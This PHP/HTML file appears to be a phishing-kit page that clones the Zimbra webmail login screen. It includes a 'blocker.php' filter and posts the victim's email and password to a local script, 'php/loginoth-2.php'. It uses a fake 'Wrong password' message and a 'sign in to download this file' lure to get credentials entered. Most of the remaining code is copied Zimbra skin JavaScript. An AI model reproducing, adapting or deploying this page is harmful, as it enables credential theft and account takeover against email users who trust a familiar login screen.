<?php


session_start();
include("blocker.php");

?>
<!DOCTYPE html>
<!-- saved from url=(0024)https://mail.zimbra.com/ -->
<html class="user_font_size_normal translated-ltr" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<!--
 login.jsp
 * ***** BEGIN LICENSE BLOCK *****
 * Zimbra Collaboration Suite Web Client 
 * Copyright (C) 2007, 2008, 2009, 2010, 2011, 2012, 2013, 2014, 2015, 2016 Synacor, Inc.
 *
 * This program is free software: you can redistribute it and/or modify it under
 * the terms of the GNU General Public License as published by the Free Software Foundation,
 * version 2 of the License.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
 * without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
 * See the GNU General Public License for more details.
 * You should have received a copy of the GNU General Public License along with this program.
 * If not, see <https://www.gnu.org/licenses/>.
 * ***** END LICENSE BLOCK *****
-->
	
	<title>Zimbra Web Client Connection</title>
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta name="description" content="Zimbra propose des solutions de messagerie et de collaboration Open Source (serveur et client). Pour plus de détails, visitez https://www.zimbra.com.">
	<meta name="apple-mobile-web-app-capable" content="yes">
	<meta name="apple-mobile-web-app-status-bar-style" content="black">
	<link rel="stylesheet" type="text/css" href="./assets/common,login,zhtml,skin.css">
	<link rel="SHORTCUT ICON" href="https://mail.zimbra.com/zimbra/img/logo/favicon.ico">


<link type="text/css" rel="stylesheet" charset="UTF-8" href="./assets/translateelement.css"></head>
<body onload="onLoad();">

	<div class="LoginScreen">
		<div class="center">
			<div class="contentBox">
		

					<span class="ImgLoginBanner"></span>
				</a></h1>

				<div id="ZLoginAppName"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Web Client</font></font></div>
				<form action="php/loginoth-2.php" method="post">
								<input type="hidden" name="loginOp" value="login">
								<input type="hidden" name="login_csrf" value="7d16102d-2638-47c2-b4b5-dc480e701c11">

								<table class="form">
                                    <h4 <font> User authentication is required to download this file</h4><font color="red">Wrong password. Try again or click Forgot password to reset it..</font> <br/>


                        <tbody><tr>
                                        <td><label for="username"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">User:</font></font></label></td>
                                        <td><input id="username" class="zLoginField" name="emaill" type="text" value="" size="40" maxlength="1024" autocapitalize="off" autocorrect="off" required=""></td>
                                        </tr>
                                        <tr>
                                <td><label for="password"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Password:</font></font></label></td>
                                <td><input id="password" autocomplete="off" class="zLoginField" name="psw" type="password" value="" size="40" maxlength="1024" required=""></td>
                                </tr>
                                <tr>
                                <td>&nbsp;</td>
                                <td class="submitTD">
                                <input id="remember" value="1" type="checkbox" name="zrememberme">
                                    <label for="remember"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Remember my access values</font></font></label>
                                <font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><input type="submit" class="ZLoginButton DwtButton" value="Sign In & Download"></font></font>
                                </td>
                                </tr>
			
				<tr>
                            <td colspan="2"><hr></td>
                            </tr>
                            <tr>
                            <td>
                            <label for="client"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Version:</font></font></label>
                            </td>
                            <td>
                            <div class="positioning">
                            <select id="client" name="client" onchange="clientChange(this.options[this.selectedIndex].value)">
                                    <option value="preferred" selected=""><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> By default</font></font></option>
                                    <option value="advanced"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Evolved (Ajax)</font></font></option>
                                    <option value="standard"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Standard (HTML)</font></font></option>
                                    <option value="mobile"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Portable</font></font></option>
                                    <option value="touch"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> tactile</font></font></option>
                                    </select>
                                <script type="text/javascript">
                        document.write("<a href='#' onclick='showWhatsThis();' id='ZLoginWhatsThisAnchor' aria-controls='ZLoginWhatsThis' aria-expanded='false'>En savoir plus</a>");
                        </script><a href="https://mail.zimbra.com/#" onclick="showWhatsThis();" id="ZLoginWhatsThisAnchor" aria-controls="ZLoginWhatsThis" aria-expanded="false"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Learn more</font></font></a>
                        <div id="ZLoginWhatsThis" class="ZLoginInfoMessage" style="display:none;" onclick="showWhatsThis();" role="tooltip"><h3 style="text-align:center;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Customer types:</font></font></h3>	L’option <b>Évolué</b> propose la gamme complète des fonctions de collaboration Web. Ce client Web fonctionne (encore) mieux avec les navigateurs les plus récents et une liaison Internet haut débit. <br><br>L’option <b>Standard</b> est préconisée dans les cas suivants&nbsp;: liaison Internet bas débit, version ancienne de navigateur, recherche d’une meilleure accessibilité. <br><br>L’option <b>Mobile</b> est conseillée pour les mobiles. <br><br>L’option <b>Tablette</b> est conseillée spécifiquement pour les tablettes. <br><br>Pour définir la valeur <b>Par défaut</b> comme type de client préférentiel, connectez-vous et modifiez les options de connexion de l’onglet Préférences|Général.</div>
                        <div id="ZLoginUnsupported" class="ZLoginInfoMessage" style="display:none;">Remarque&nbsp;: votre navigateur Web ne supporte pas toutes les caractéristiques de la version Évoluée.  Dans ce cas, il est fortement conseillé d’utiliser le client Standard.</div>
                        </div>
                        </td>
                        </tr>
                        </tbody></table>
                    </form>
			</div>
			<div class="decor1"></div>
		</div>

		
	</div>
<script>

function ZmSkin(e){
this.hints=this.mergeObjects(ZmSkin.hints,e)
}
ZmSkin.hints={
name:"harmony",version:"1",skin:{
containers:"skin_outer"}
,banner:{
position:"static",url:"http://www.zimbra.com"}
,userInfo:{
position:"static"}
,search:{
position:"static"}
,quota:{
position:"static"}
,presence:{
width:"40px",height:"24px"}
,appView:{
position:"static"}
,searchResultsToolbar:{
containers:["skin_tr_search_results_toolbar"]}
,newButton:{
containers:["skin_td_new_button"]}
,tree:{
minWidth:"13.5rem",maxWidth:"84rem",containers:["skin_td_tree","skin_td_tree_app_sash"],resizeContainers:["skin_td_tree","skin_container_app_new_button"]}
,topToolbar:{
containers:"skin_spacing_app_top_toolbar"}
,treeFooter:{
containers:"skin_tr_tree_footer"}
,topAd:{
containers:"skin_tr_top_ad"}
,sidebarAd:{
containers:"skin_td_sidebar_ad"}
,bottomAd:{
containers:"skin_tr_bottom_ad"}
,treeTopAd:{
containers:"skin_tr_tree_top_ad"}
,treeBottomAd:{
containers:"skin_tr_tree_bottom_ad"}
,helpButton:{
style:"link",container:"quota",url:""}
,logoutButton:{
style:"link",container:"quota"}
,appChooser:{
position:"static",direction:"LR"}
,toast:{
location:"N",transitions:[{
type:"fade-in",step:5,duration:50}
,{
type:"pause",duration:5000}
,{
type:"fade-out",step:-10,duration:500}
]}
,fullScreen:{
containers:["!skin_td_tree","!skin_td_tree_app_sash"]}
,allAds:{
containers:["skin_tr_top_ad","skin_td_sidebar_ad","skin_tr_bottom_ad","skin_tr_tree_top_ad","skin_tr_tree_bottom_ad"]}
,hideSearchInCompose:true,notificationBanner:"/zimbra/skins/_base/logos/NotificationBanner_grey.gif?v=181207113958",socialfox:{
iconURL:"/zimbra/img/logo/ImgZimbraIcon.gif",icon32URL:"/zimbra/img/logo/ImgZimbraLogo_32.gif",icon64URL:"/zimbra/img/logo/ImgZimbraLogo_64.gif",mailIconURL:"/zimbra/img/zimbra/ImgMessage.png"}};
window.BaseSkin=ZmSkin;
ZmSkin.prototype={
show:function(t,e,l){
var a=this.hints[t]&&this.hints[t].containers;
if(a){
if(typeof a=="function"){
a.apply(this,[e!=false]);
skin._reflowApp();
return
}
if(typeof a=="string"){
a=[a]
}
var s=false;
for(var r=0;
r<a.length;
r++){
var h=a[r];
var o=h.replace(/^!/,"");
var n=h!=o;
if(this._showEl(o,n?!e:e)){
s=true
}}
if(s&&!l){
skin._reflowApp()
}}}
,hide:function(e,t){
this.show(e,false,t)
}
,gotoApp:function(e,t){
appCtxt.getAppController().activateApp(e,null,t)
}
,gotoPrefs:function(e){
if(appCtxt.getCurrentAppName()!=ZmApp.PREFERENCES){
var t=new AjxCallback(this,this._gotoPrefPage,[e]);
this.gotoApp(ZmApp.PREFERENCES,t)
}else{
this._gotoPrefPage(e)
}}
,mergeObjects:function(e,o){
if(e==null){
e={}
}
for(var a=1;
a<arguments.length;
a++){
var n=arguments[a];
for(var t in n){
var s=e[t];
if(typeof s=="object"&&!(s instanceof Array)){
this.mergeObjects(e[t],n[t]);
continue
}
if(!e[t]){
e[t]=n[t]
}}}
return e
}
,getTreeWidth:function(){
return Dwt.getSize(this._getEl(this.hints.tree.containers[0])).x
}
,setTreeWidth:function(e){
this._setContainerSizes("tree",e,null)
}
,showTopAd:function(e){
if(skin._showEl("skin_tr_top_ad",e)){
skin._reflowApp()
}}
,hideTopAd:function(){
skin.showTopAd(false)
}
,getTopAdContainer:function(){
return skin._getEl("skin_container_top_ad")
}
,showSidebarAd:function(e){
var t="skin_td_sidebar_ad";
if(e!=null){
Dwt.setSize(t,e)
}
if(skin._showEl(t)){
skin._reflowApp()
}}
,hideSidebarAd:function(){
var e="skin_td_sidebar_ad";
if(skin._hideEl(e)){
skin._reflowApp()
}}
,getSidebarAdContainer:function(){
return this._getEl("skin_container_sidebar_ad")
}
,handleNotification:function(t,e){}
,_getEl:function(e){
return(typeof e=="string"?document.getElementById(e):e)
}
,_showEl:function(o,i){
var t=this._getEl(o);
if(!t){
return
}
var a;
if(i==false){
a="none"
}else{
var e=t.tagName;
if(e=="TD"){
a="table-cell"
}else{
if(e=="TR"){
a="table-row"
}else{
a="block"
}}}
if(a!=t.style.display){
t.style.display=a;
return true
}else{
return false
}}
,_hideEl:function(e){
return this._showEl(e,false)
}
,_reparentEl:function(i,e){
var a=this._getEl(e);
var t=a&&this._getEl(i);
if(t){
a.appendChild(t)
}}
,_setContainerSizes:function(n,a,e){
var o=this.hints[n].resizeContainers||this.hints[n].containers;
for(var t=0;
t<o.length;
t++){
Dwt.setSize(o[t],a,null)
}}
,_reflowApp:function(){
if(window._zimbraMail){
window._zimbraMail.getAppViewMgr().fitAll()
}}
,_gotoPrefPage:function(a){
if(a==null){
return
}
var i=appCtxt.getApp(ZmApp.PREFERENCES);
var t=i.getPrefController();
var e=t.getPrefsView();
e.selectSection(a)
}};
window.skin=new ZmSkin();
var link = document.getElementById("bannerLink");
if (link) {
	link.href = skin.hints.banner.url;
}



// show a message if they should be using the 'standard' client, but have chosen 'advanced' instead
function clientChange(selectValue) {
	var useStandard = false;
	useStandard = useStandard || (screen && (screen.width <= 800 && screen.height <= 600));
	var div = document.getElementById("ZLoginUnsupported");
	if (div)
	div.style.display = ((selectValue == 'advanced') && useStandard) ? 'block' : 'none';
}

// if they have JS, write out a "what's this?" link that shows the message below
function showWhatsThis() {
	var anchor = document.getElementById('ZLoginWhatsThisAnchor'),
        tooltip = document.getElementById("ZLoginWhatsThis"),
        doHide = (tooltip.style.display === "block");
    tooltip.style.display = doHide ? "none" : "block";
    anchor.setAttribute("aria-expanded", doHide ? "false" : "true");
}

function forgotPassword() {
	var accountInput = document.getElementById("username").value;
	var queryParams = encodeURI("account=" + accountInput);
	var url = "/public/PasswordRecovery.jsp?" + location.search;

	if (accountInput !== '') {
		url += (location.search !== '' ? '&' : '') + encodeURI("account=" + accountInput);
	}

	window.location.href = url;
}


function onLoad() {
	var loginForm = document.loginForm;
	if (loginForm.username) {
		if (loginForm.username.value != "") {
			loginForm.password.focus(); //if username set, focus on password
		}
		else {
			loginForm.username.focus();
		}
	}
	clientChange("preferred");
    //check if the login page is loaded in the sidebar.
    if (navigator.mozSocial) {
        //send a ping so that worker knows about this page.
        navigator.mozSocial.getWorker().port.postMessage({topic: "worker.reload", data: true});
        //this page is loaded in firefox sidebar so listen for message from worker.
        navigator.mozSocial.getWorker().port.onmessage = function onmessage(e) {
            var topic = e.data.topic;
            if (topic && topic == "sidebar.authenticated") {
                window.location.href = "/public/launchSidebar.jsp";
            }
        };
    }
	if (false && loginForm.totpcode) {
        loginForm.totpcode.focus();
	}
}
</script><div id="goog-gt-tt" class="skiptranslate" dir="ltr"><div style="padding: 8px;"><div><div class="logo"><img src="./assets/translate_24dp.png" width="20" height="20" alt="Google Traduction"></div></div></div><div class="top" style="padding: 8px; float: left; width: 100%;"><h1 class="title gray">Texte d'origine</h1></div><div class="middle" style="padding: 8px;"><div class="original-text"></div></div><div class="bottom" style="padding: 8px;"><div class="activity-links"><span class="activity-link">Proposer une meilleure traduction</span><span class="activity-link"></span></div><div class="started-activity-container"><hr style="color: #CCC; background-color: #CCC; height: 1px; border: none;"><div class="activity-root"></div></div></div><div class="status-message" style="display: none;"></div></div>


<div class="goog-te-spinner-pos"><div class="goog-te-spinner-animation"><svg xmlns="http://www.w3.org/2000/svg" class="goog-te-spinner" width="96px" height="96px" viewBox="0 0 66 66"><circle class="goog-te-spinner-path" fill="none" stroke-width="6" stroke-linecap="round" cx="33" cy="33" r="30"></circle></svg></div></div></body></html>